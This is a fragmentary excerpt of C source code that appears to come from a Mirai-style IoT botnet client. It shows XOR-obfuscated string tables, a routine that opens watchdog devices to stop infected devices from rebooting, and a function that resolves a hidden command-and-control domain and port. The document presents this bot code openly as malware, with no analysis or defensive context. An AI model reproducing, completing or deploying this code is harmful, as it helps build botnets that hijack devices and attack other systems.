...
int fd_ctrl = -1, fd_serv = -1, ioctl_pid = 0,  num_tries = 0, main_pid;
...
void ioctl_keepalive(void)
{
    ...
    table_unlock_val(XOR_WATCHDOG1);
    table_unlock_val(XOR_WATCHDOG2);
    table_unlock_val(XOR_WATCHDOG3);
    table_unlock_val(XOR_WATCHDOG4);
    table_unlock_val(XOR_WATCHDOG5);
    table_unlock_val(XOR_WATCHDOG6);
    table_unlock_val(XOR_WATCHDOG7);
    table_unlock_val(XOR_WATCHDOG8);      

    if((ioctl_fd = open(table_retrieve_val(XOR_WATCHDOG1, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(XOR_WATCHDOG2, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(XOR_WATCHDOG3, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(XOR_WATCHDOG4, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(XOR_WATCHDOG5, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(XOR_WATCHDOG6, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(XOR_WATCHDOG7, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(XOR_WATCHDOG8, NULL), 2)) != -1)
    {
        #ifdef DEBUG
    ...
    table_lock_val(XOR_WATCHDOG1);
    table_lock_val(XOR_WATCHDOG2);
    table_lock_val(XOR_WATCHDOG3);
    table_lock_val(XOR_WATCHDOG4);
    table_lock_val(XOR_WATCHDOG5);
    table_lock_val(XOR_WATCHDOG6);
    table_lock_val(XOR_WATCHDOG7);
    table_lock_val(XOR_WATCHDOG8);
...
int main(int argc, char **args)
{
    ...
    char *dirr[3] = {"zxcr9999", "zxcr9999", "zxcr9999"};
    int fag;
    fag = rand_next() % 3;
    ...
    table_unlock_val(XOR_EXEC);
    tbl_exec_succ = table_retrieve_val(XOR_EXEC, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(XOR_EXEC);
...
static void resolve_cnc_addr(void)
{
    ...
    table_unlock_val(XOR_DOMAIN);
    entries = resolv_lookup(table_retrieve_val(XOR_DOMAIN, NULL));
    table_lock_val(XOR_DOMAIN);
    if (entries == NULL)
    {
        return;
    }
    ...
    table_unlock_val(XOR_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(XOR_PORT, NULL));
    table_lock_val(XOR_PORT);
